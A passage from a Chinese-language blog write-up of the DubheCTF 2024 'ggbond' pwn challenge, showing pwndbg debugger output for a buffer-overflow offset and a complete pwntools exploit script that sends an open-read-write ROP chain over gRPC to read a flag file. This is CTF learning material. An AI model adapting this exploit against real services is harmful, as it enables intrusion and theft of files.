+</span></span><span style="display:flex;"><span> RSI  0xc0001bb628 ◂— 0x0
+</span></span><span style="display:flex;"><span> RSP  0xc0001bb5e0 —▸ 0xc0001aa000 ◂— 0x4847464544434241 <span style="color:#ff79c6">(</span><span style="color:#f1fa8c">&#39;ABCDEFGH&#39;</span><span style="color:#ff79c6">)</span>
+</span></span><span style="display:flex;"><span>*RIP  0x7ee024 ◂— movzx r10d, byte ptr <span style="color:#ff79c6">[</span>rdi<span style="color:#ff79c6">]</span>
+</span></span><span style="display:flex;"><span>   0x7ee01e    mov    r8, rsi
+</span></span><span style="display:flex;"><span>   0x7ee021    mov    r9, rdi
+</span></span><span style="display:flex;"><span> ► 0x7ee024    movzx  r10d, byte ptr <span style="color:#ff79c6">[</span>rdi<span style="color:#ff79c6">]</span>
+</span></span><span style="display:flex;"><span>   0x7ee028    mov    byte ptr <span style="color:#ff79c6">[</span>rsi<span style="color:#ff79c6">]</span>, r10b
+</span></span><span style="display:flex;"><span>   0x7ee02b    inc    rax
+</span></span><span style="display:flex;"><span>   0x7ee02e    lea    rsi, <span style="color:#ff79c6">[</span>r8 + 1<span style="color:#ff79c6">]</span>
+</span></span><span style="display:flex;"><span>   0x7ee032    lea    rdi, <span style="color:#ff79c6">[</span>r9 + 1<span style="color:#ff79c6">]</span>
+</span></span><span style="display:flex;"><span>   0x7ee036    cmp    rax, rdx
+</span></span><span style="display:flex;"><span>   0x7ee039    jl     0x7ee01e                      &lt;0x7ee01e&gt;
+</span></span><span style="display:flex;"><span>    ↓
+</span></span><span style="display:flex;"><span>   0x7ee01e    mov    r8, rsi
+</span></span><span style="display:flex;"><span>   0x7ee021    mov    r9, rdi
+</span></span><span style="display:flex;"><span>pwndbg&gt; p/x 0xc0001bb6e8-0xc0001bb628
+</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">$2</span> <span style="color:#ff79c6">=</span> 0xc0
+</span></span></code></pre></div><p>然后就是写ROP了: ORW将flag打出来,使用syscall.</p>
+<p>查看别人的WP,打远程</p>
+<ul>
+<li>先 nc 目标端口，用来接收orw的结果</li>
+<li>再建立一个rpc连接，用来打</li>
+</ul>
+<p>打本地:这个文件fd得调试出来.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#ff79c6">import</span> grpc
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">import</span> ggbond_pb2
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">import</span> ggbond_pb2_grpc
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">from</span> pwn <span style="color:#ff79c6">import</span> <span style="color:#ff79c6">*</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>channel <span style="color:#ff79c6">=</span> grpc<span style="color:#ff79c6">.</span>insecure_channel(<span style="color:#f1fa8c">&#39;127.0.0.1:23334&#39;</span>)
+</span></span><span style="display:flex;"><span>stub <span style="color:#ff79c6">=</span> ggbond_pb2_grpc<span style="color:#ff79c6">.</span>GGBondServerStub(channel)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">def</span> <span style="color:#50fa7b">whoami_request</span>():
+</span></span><span style="display:flex;"><span>    msg <span style="color:#ff79c6">=</span> ggbond_pb2<span style="color:#ff79c6">.</span>WhoamiRequest()
+</span></span><span style="display:flex;"><span>    req <span style="color:#ff79c6">=</span> ggbond_pb2<span style="color:#ff79c6">.</span>Request(whoami<span style="color:#ff79c6">=</span>msg)
+</span></span><span style="display:flex;"><span>    resp <span style="color:#ff79c6">=</span> stub<span style="color:#ff79c6">.</span>Handler(req)
+</span></span><span style="display:flex;"><span>    <span style="color:#8be9fd;font-style:italic">print</span>(<span style="color:#f1fa8c">&#34;Greeter client received: &#34;</span> <span style="color:#ff79c6">+</span> resp<span style="color:#ff79c6">.</span>whoami<span style="color:#ff79c6">.</span>message)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">def</span> <span style="color:#50fa7b">role_change_request</span>(role: <span style="color:#8be9fd;font-style:italic">int</span>):
+</span></span><span style="display:flex;"><span>    msg <span style="color:#ff79c6">=</span> ggbond_pb2<span style="color:#ff79c6">.</span>RoleChangeRequest()
+</span></span><span style="display:flex;"><span>    msg<span style="color:#ff79c6">.</span>role <span style="color:#ff79c6">=</span> role
+</span></span><span style="display:flex;"><span>    req <span style="color:#ff79c6">=</span> ggbond_pb2<span style="color:#ff79c6">.</span>Request(role_change<span style="color:#ff79c6">=</span>msg)
+</span></span><span style="display:flex;"><span>    resp <span style="color:#ff79c6">=</span> stub<span style="color:#ff79c6">.</span>Handler(req)
+</span></span><span style="display:flex;"><span>    <span style="color:#8be9fd;font-style:italic">print</span>(<span style="color:#f1fa8c">&#34;Greeter client received: &#34;</span> <span style="color:#ff79c6">+</span> resp<span style="color:#ff79c6">.</span>role_change<span style="color:#ff79c6">.</span>message)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">def</span> <span style="color:#50fa7b">repeater_request</span>(m):
+</span></span><span style="display:flex;"><span>    msg <span style="color:#ff79c6">=</span> ggbond_pb2<span style="color:#ff79c6">.</span>RepeaterRequest()
+</span></span><span style="display:flex;"><span>    msg<span style="color:#ff79c6">.</span>message <span style="color:#ff79c6">=</span> m
+</span></span><span style="display:flex;"><span>    req <span style="color:#ff79c6">=</span> ggbond_pb2<span style="color:#ff79c6">.</span>Request(repeater<span style="color:#ff79c6">=</span>msg)
+</span></span><span style="display:flex;"><span>    resp <span style="color:#ff79c6">=</span> stub<span style="color:#ff79c6">.</span>Handler(req)
+</span></span><span style="display:flex;"><span>    <span style="color:#8be9fd;font-style:italic">print</span>(<span style="color:#f1fa8c">&#34;Greeter client received: &#34;</span> <span style="color:#ff79c6">+</span> resp<span style="color:#ff79c6">.</span>repeater<span style="color:#ff79c6">.</span>message)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#6272a4"># role_change_request(1)</span>
+</span></span><span style="display:flex;"><span><span style="color:#6272a4"># whoami_request()</span>
+</span></span><span style="display:flex;"><span><span style="color:#6272a4"># repeater_request(cyclic(100))</span>
+</span></span><span style="display:flex;"><span><span style="color:#6272a4">#</span>
+</span></span><span style="display:flex;"><span><span style="color:#6272a4"># role_change_request(2)</span>
+</span></span><span style="display:flex;"><span><span style="color:#6272a4"># whoami_request()</span>
+</span></span><span style="display:flex;"><span><span style="color:#6272a4"># repeater_request(cyclic(100))</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>syscall <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0x000000000040452c</span>
+</span></span><span style="display:flex;"><span>pop_rdi_ret <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0x0000000000401537</span>
+</span></span><span style="display:flex;"><span>pop_rsi_ret <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0x0000000000422398</span>
+</span></span><span style="display:flex;"><span>pop_rax_ret <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0x00000000004101e6</span>
+</span></span><span style="display:flex;"><span>pop_rdx_ret <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0x0000000000461bd1</span>
+</span></span><span style="display:flex;"><span>flag <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0x00000000007ef68d</span>
+</span></span><span style="display:flex;"><span>bss_buf <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0xC6CF60</span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;a&#34;</span> <span style="color:#ff79c6">*</span> <span style="color:#bd93f9">0xc0</span> <span style="color:#ff79c6">+</span> p64(<span style="color:#bd93f9">0xdeadbeef</span>)
+</span></span><span style="display:flex;"><span>context<span style="color:#ff79c6">.</span>arch<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;amd64&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#6272a4"># open(&#34;flag&#34;, 0) -&gt; syscall(2, &#39;flag&#39;, 0)</span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#ff79c6">+=</span> flat([
+</span></span><span style="display:flex;"><span>    pop_rax_ret, <span style="color:#bd93f9">2</span>,
+</span></span><span style="display:flex;"><span>    pop_rdi_ret, flag,
+</span></span><span style="display:flex;"><span>    pop_rsi_ret, <span style="color:#bd93f9">0</span>,
+</span></span><span style="display:flex;"><span>    pop_rdx_ret, <span style="color:#bd93f9">0</span>,
+</span></span><span style="display:flex;"><span>    syscall,
+</span></span><span style="display:flex;"><span>])
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#6272a4"># read(fd, buf, len)</span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#ff79c6">+=</span> flat([
+</span></span><span style="display:flex;"><span>    pop_rax_ret, <span style="color:#bd93f9">0</span>,
+</span></span><span style="display:flex;"><span>    pop_rdi_ret, <span style="color:#bd93f9">10</span>,
+</span></span><span style="display:flex;"><span>    pop_rsi_ret, bss_buf,
+</span></span><span style="display:flex;"><span>    pop_rdx_ret, <span style="color:#bd93f9">0x100</span>,
+</span></span><span style="display:flex;"><span>    syscall,
+</span></span><span style="display:flex;"><span>])
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#6272a4"># write(fd, buf, len)</span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#ff79c6">+=</span> flat([
+</span></span><span style="display:flex;"><span>    pop_rax_ret, <span style="color:#bd93f9">1</span>,
+</span></span><span style="display:flex;"><span>    pop_rdi_ret, <span style="color:#bd93f9">1</span>,
+</span></span><span style="display:flex;"><span>    pop_rsi_ret, bss_buf,
+</span></span><span style="display:flex;"><span>    pop_rdx_ret, <span style="color:#bd93f9">0x100</span>,
+</span></span><span style="display:flex;"><span>    syscall,
+</span></span><span style="display:flex;"><span>])
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#6272a4"># exit 1</span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#ff79c6">+=</span> flat([
+</span></span><span style="display:flex;"><span>    pop_rax_ret, <span style="color:#bd93f9">60</span>,
+</span></span><span style="display:flex;"><span>    pop_rdi_ret, <span style="color:#bd93f9">1</span>,
+</span></span><span style="display:flex;"><span>    syscall,
+</span></span><span style="display:flex;"><span>])
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>sleep(<span style="color:#bd93f9">2</span>)
+</span></span><span style="display:flex;"><span>whoami_request()
+</span></span><span style="display:flex;"><span>role_change_request(<span style="color:#bd93f9">3</span>)
+</span></span><span style="display:flex;"><span>repeater_request(base64<span style="color:#ff79c6">.</span>b64encode(payload))
+</span></span><span style="display:flex;"><span>channel<span style="color:#ff79c6">.</span>close()
+</span></span></code></pre></div><h2 id="参考">参考</h2>
+<ul>
+<li><a href="https://blog.wm-team.cn/index.php/archives/72/">DubheCTF 2024 By W&amp;M</a></li>
+</ul>
+		</section>
+
+		<div class="post-tags">
+			
+			
+			<nav class="nav tags">
+				<ul class="tags">
+					
+					<li><a href="/tags/ctf">ctf</a></li>
+					
+				</ul>
+			</nav>
+			
+			
+		</div>
+		<div id="disqus_thread"></div>
+<script type="text/javascript">
+    (function () {
+        
+        
+        if (window.location.hostname == "localhost")
+            return;
+
+        var dsq = document.createElement('script');
+        dsq.type = 'text/javascript';
+        dsq.async = true;
+        var disqus_shortname = 'ldrx30';
+        dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+        (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+    })();
+</script>
+
+</article>
+</main>
+<footer>
+  <div style="display:flex"><a class="soc" href="https://github.com/ldrx30" rel="me" title="GitHub"><i data-feather="github"></i></a>
+    <a class="border"></a></div>
+  <div class="footer-info">
+    2024  © ldrx30 |  <a
+      href="https://github.com/athul/archie">Archie Theme</a> | Built with <a href="https://gohugo.io">Hugo</a>
+  </div>
+</footer>
+<script>
+  feather.replace()
+</script></div>
+    </body>
+</html>
